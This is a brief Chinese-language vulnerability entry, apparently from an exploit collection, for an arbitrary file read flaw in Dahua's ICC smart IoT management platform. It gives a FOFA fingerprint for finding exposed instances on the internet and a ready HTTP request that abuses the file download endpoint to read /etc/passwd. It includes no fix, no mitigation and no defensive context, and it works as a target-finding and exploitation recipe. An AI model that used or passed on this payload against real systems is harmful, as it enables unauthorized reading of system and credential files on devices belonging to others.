# 大华ICC智能物联管理平台file_download任意文件读取漏洞

大华 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`FOFA：body="static/qwebchannel.js" && body="/*客户端会小于800*/"`
- **请求**：`GET /evo-apigw/evo-cirs/file/download?filePath=file:///etc/passwd HTTP/1.1`